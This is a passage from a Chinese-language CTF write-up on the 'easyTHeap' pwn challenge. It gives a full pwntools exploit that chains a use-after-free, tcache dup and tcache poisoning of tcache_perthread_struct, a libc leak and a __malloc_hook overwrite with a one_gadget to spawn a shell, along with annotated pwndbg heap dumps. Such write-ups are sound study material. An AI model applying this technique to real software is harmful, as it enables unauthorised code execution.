#malloc_data_ptr</span><br><span class="line">    			#chunk1_data_ptr    #chunk2_data_ptr</span><br><span class="line"><span class="number">0x555555756090</span>:	<span class="number">0x00005555557572b0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    			#chunk3_data_ptr</span><br><span class="line"><span class="number">0x5555557560a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>先贴一下 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./vn_pwn_easyTHeap_patch&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;, 25389)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vn_pwn_easyTHeap_patch&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size?&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx?&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>, p64(heap_base - <span class="number">0x250</span>))</span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#2</span></span><br><span class="line">new(<span class="number">0x50</span>) <span class="comment">#3</span></span><br><span class="line">edit(<span class="number">3</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">one_gadget=[<span class="number">0x4f365</span>,<span class="number">0x4f3c2</span>,<span class="number">0x10a45c</span>]</span><br><span class="line">one = libc_base + one_gadget[<span class="number">2</span>]</span><br><span class="line">new(<span class="number">0x50</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="string">&#x27;b&#x27;</span> * <span class="number">0x48</span> +  p64(malloc_hook - <span class="number">0x13</span>))</span><br><span class="line">new(<span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;\x00&#x27;</span> * (<span class="number">0x13</span> - <span class="number">0x8</span>) + p64(one) + p64(realloc + <span class="number">8</span>))</span><br><span class="line">new(<span class="number">0x10</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h2><p>由于程序开启了 PIE 保护，因此首先我们利用 tcache_bin_attack 中的 Tcache dup 漏洞对创建的堆块进行多次 free，打印堆块内容是就会打印出 heap 地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x50</span>) <span class="comment">#0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap_base)</span><br></pre></td></tr></table></figure>

<p>执行此段 payload 后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x555555757250</span></span><br><span class="line"><span class="function">Size: 0x61</span></span><br><span class="line"><span class="function">fd: 0x555555757260</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Top chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x5555557572b0</span></span><br><span class="line"><span class="function">Size: 0x20d51</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">pwndbg&gt; x/100gx 0x555555757000</span></span><br><span class="line"><span class="function">0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct</span></span><br><span class="line"><span class="function">0x555555757010:	0x0000000200000000	0x0000000000000000</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x555555757070:	0x0000555555757260	0x0000000000000000</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x555555757250:	0x0000000000000000	0x0000000000000061 #chunk0</span></span><br><span class="line"><span class="function">0x555555757260:	0x0000555555757260	0x0000000000000000</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x5555557572b0:	0x0000000000000000	0x0000000000020d51 #top_chunk</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x555555757310:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">pwndbg&gt; x/16gx 0x555555756060</span></span><br><span class="line"><span class="function">0x555555756060:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">    			#这里没有数据是因为在<span class="built_in">free</span>此堆块时，程序将其size置0</span></span><br><span class="line"><span class="function">                #具体请参考IDA伪代码</span></span><br><span class="line"><span class="function">0x555555756070:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x555555756080:	0x0000555555757260	0x0000000000000000</span></span><br><span class="line"><span class="function">    			#UAF，chunk1_data_ptr</span></span><br><span class="line"><span class="function">0x555555756090:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x5555557560a0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x5555557560b0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x5555557560c0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x5555557560d0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">pwndbg&gt; bin</span></span><br><span class="line"><span class="function">tcachebins</span></span><br><span class="line"><span class="function">0x60 [  2]: 0x555555757260 ◂— 0x555555757260 <span class="comment">/* &#x27;`ruUUU&#x27; */</span></span></span><br><span class="line"><span class="function">fastbins</span></span><br><span class="line"><span class="function">0x20: 0x0</span></span><br><span class="line"><span class="function">0x30: 0x0</span></span><br><span class="line"><span class="function">0x40: 0x0</span></span><br><span class="line"><span class="function">0x50: 0x0</span></span><br><span class="line"><span class="function">0x60: 0x0</span></span><br><span class="line"><span class="function">0x70: 0x0</span></span><br><span class="line"><span class="function">0x80: 0x0</span></span><br><span class="line"><span class="function">unsortedbin</span></span><br><span class="line"><span class="function">all: 0x0</span></span><br><span class="line"><span class="function">smallbins</span></span><br><span class="line"><span class="function">empty</span></span><br><span class="line"><span class="function">largebins</span></span><br><span class="line"><span class="function">empty</span></span><br><span class="line"><span class="function">pwndbg&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>由于 UAF 漏洞的存在，chunk_data 指针没有置空，因此可以进行多次 free。</strong></p>
<blockquote>
<p>exp 中的 heap_base 其实指的是泄露出来的堆地址，而并非堆基地址<br>heap_base=0x555555757260</p>
</blockquote>
<h2 id="利用-Tcache-poisoning-控制-tcache-perthread-struct"><a href="#利用-Tcache-poisoning-控制-tcache-perthread-struct" class="headerlink" title="利用 Tcache_poisoning 控制 tcache_perthread_struct"></a>利用 Tcache_poisoning 控制 tcache_perthread_struct</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x50</span>) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>, p64(heap_base - <span class="number">0x250</span>))</span><br></pre></td></tr></table></figure>

<p>如上面所示，我们可以利用 tcache_poisoning 更改堆块的 next 指针，首先先创建了一个 chunk：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0x50</span>) <span class="comment">#1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x555555757250</span></span><br><span class="line"><span class="function">Size: 0x61</span></span><br><span class="line"><span class="function">fd: 0x555555757260</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Top chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x5555557572b0</span></span><br><span class="line"><span class="function">Size: 0x20d51</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">pwndbg&gt; bin</span></span><br><span class="line"><span class="function">tcachebins</span></span><br><span class="line"><span class="function">0x60 [  1]: 0x555555757260 ◂— 0x555555757260 <span class="comment">/* &#x27;`ruUUU&#x27; */</span></span></span><br><span class="line"><span class="function">fastbins</span></span><br><span class="line"><span class="function">0x20: 0x0</span></span><br><span class="line"><span class="function">0x30: 0x0</span></span><br><span class="line"><span class="function">0x40: 0x0</span></span><br><span class="line"><span class="function">0x50: 0x0</span></span><br><span class="line"><span class="function">0x60: 0x0</span></span><br><span class="line"><span class="function">0x70: 0x0</span></span><br><span class="line"><span class="function">0x80: 0x0</span></span><br><span class="line"><span class="function">unsortedbin</span></span><br><span class="line"><span class="function">all: 0x0</span></span><br><span class="line"><span class="function">smallbins</span></span><br><span class="line"><span class="function">empty</span></span><br><span class="line"><span class="function">largebins</span></span><br><span class="line"><span class="function">empty</span></span><br><span class="line"><span class="function">pwndbg&gt; x/100gx 0x555555757000</span></span><br><span class="line"><span class="function">0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct</span></span><br><span class="line"><span class="function">0x555555757010:	0x0000000100000000	0x0000000000000000</span></span><br><span class="line"><span class="function">    			#tcache_count</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x555555757070:	0x0000555555757260	0x0000000000000000</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x555555757250:	0x0000000000000000	0x0000000000000061 #<span class="title">chunk0</span><span class="params">(chunk1)</span></span></span><br><span class="line"><span class="function">0x555555757260:	0x0000555555757260	0x0000000000000000</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x5555557572b0:	0x0000000000000000	0x0000000000020d51 #top_chunk</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x555555757310:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">pwndbg&gt; x/16gx 0x555555756060</span></span><br><span class="line"><span class="function">0x555555756060:	0x0000005000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">    			#size1</span>=<span class="number">0x50</span></span><br><span class="line"><span class="number">0x555555756070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756080</span>:	<span class="number">0x0000555555757260</span>	<span class="number">0x0000555555757260</span></span><br><span class="line">    			#chunk0_data_ptr    #chunk1_data_ptr</span><br><span class="line">    			#两个指针相同的原因是之前的Tcache dup导致的</span><br><span class="line"><span class="number">0x555555756090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由于之前 tcache 中有两个 free_chunk（实际上是同一个），因此申请的空间从 tcache_bin 中移出，这就造成了 tcachebins 中现在的 free_chunk 只有一个，但是这个 free_chunk 和移出的 chunk 是同一个堆块。so，这个 chunk 仍然处于存在 next 指针。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>, p64(heap_base - <span class="number">0x250</span>))</span><br></pre></td></tr></table></figure>

<p>然后编辑这个 chunk 中的 next 指针，结果如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x555555757250</span></span><br><span class="line"><span class="function">Size: 0x61</span></span><br><span class="line"><span class="function">fd: 0x555555757010</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Top chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x5555557572b0</span></span><br><span class="line"><span class="function">Size: 0x20d51</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">pwndbg&gt; x/100gx 0x555555757000</span></span><br><span class="line"><span class="function">0x555555757000:	0x0000000000000000	0x0000000000000251 #tcache_perthread_struct</span></span><br><span class="line"><span class="function">0x555555757010:	0x0000000100000000	0x0000000000000000</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x555555757070:	0x0000555555757260	0x0000000000000000</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x555555757250:	0x0000000000000000	0x0000000000000061 #chunk0（chunk1）</span></span><br><span class="line"><span class="function">0x555555757260:	0x0000555555757010	0x000000000000000a</span></span><br><span class="line"><span class="function">    			<span class="meta">#next指针已被修改</span></span></span><br><span class="line"><span class="function">    			#现在指向tcache_perthread_struct_data</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x5555557572b0:	0x0000000000000000	0x0000000000020d51 #top_chunk</span></span><br><span class="line"><span class="function">.......<span class="params">(省略内容均为空)</span></span></span><br><span class="line"><span class="function">0x555555757310:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">pwndbg&gt; x/16gx 0x555555756060</span></span><br><span class="line"><span class="function">0x555555756060:	0x0000005000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x555555756070:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x555555756080:	0x0000555555757260	0x0000555555757260</span></span><br><span class="line"><span class="function">0x555555756090:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x5555557560a0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x5555557560b0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x5555557560c0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">0x5555557560d0:	0x0000000000000000	0x0000000000000000</span></span><br><span class="line"><span class="function">pwndbg&gt; bin</span></span><br><span class="line"><span class="function">tcachebins</span></span><br><span class="line"><span class="function">0x60 [  1]: 0x555555757260 —▸ 0x555555757010 ◂— ...</span></span><br><span class="line"><span class="function">fastbins</span></span><br><span class="line"><span class="function">0x20: 0x0</span></span><br><span class="line"><span class="function">0x30: 0x0</span></span><br><span class="line"><span class="function">0x40: 0x0</span></span><br><span class="line"><span class="function">0x50: 0x0</span></span><br><span class="line"><span class="function">0x60: 0x0</span></span><br><span class="line"><span class="function">0x70: 0x0</span></span><br><span class="line"><span class="function">0x80: 0x0</span></span><br><span class="line"><span class="function">unsortedbin</span></span><br><span class="line"><span class="function">all: 0x0</span></span><br><span class="line"><span class="function">smallbins</span></span><br><span class="line"><span class="function">empty</span></span><br><span class="line"><span class="function">largebins</span></span><br><span class="line"><span class="function">empty</span></span><br><span class="line"><span class="function">pwndbg&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="申请-tcache-perthread-struct-内存"><a href="#申请-tcache-perthread-struct-内存" class="headerlink" title="申请 tcache_perthread_struct 内存"></a>申请 tcache_perthread_struct 内存</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span>(<span class="number">0x50</span>) #<span class="number">2</span></span><br><span class="line"><span class="keyword">new</span>(<span class="number">0x50</span>) #<span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>创建 2 个 chunk 之后就会完全控制 tcache_perthread_struct，结果如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757250</span></span><br><span class="line">Size: <span class="number">0x61</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5555557572b0</span></span><br><span class="line">Size: <span class="number">0x20d51</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">100</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line"><span class="number">0x555555757010</span>:	<span class="number">0x000000ff00000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    			#tcache_count=<span class="number">-1</span>=<span class="number">0xff</span></span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span> #chunk0（chunk1）</span><br><span class="line"><span class="number">0x555555757260</span>:	<span class="number">0x0000555555757010</span>	<span class="number">0x000000000000000a</span></span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x5555557572b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020d51</span></span><br><span class="line">.......(省略内容均为空)</span><br><span class="line"><span class="number">0x555555757310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">16</span>gx <span class="number">0x555555756060</span></span><br><span class="line"><span class="number">0x555555756060</span>:	<span class="number">0x0000005000000000</span>	<span class="number">0x0000005000000050</span></span><br><span class="line"><span class="number">0x555555756070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555756080</span>:	<span class="number">0x0000555555757260</span>	<span class="number">0x0000555555757260</span></span><br><span class="line">				#chunk0_data_ptr    #chunk1_data_ptr</span><br><span class="line"><span class="number">0x555555756090</span>:	<span class="number">0x0000555555757260</span>	<span class="number">0x0000555555757010</span></span><br><span class="line">       #chunk1_data_ptr(<span class="built_in">malloc</span>所致)  #tcache_perthread_struct_data</span><br><span class="line"><span class="number">0x5555557560a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555557560d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x60</span> [ <span class="number">-1</span>]: <span 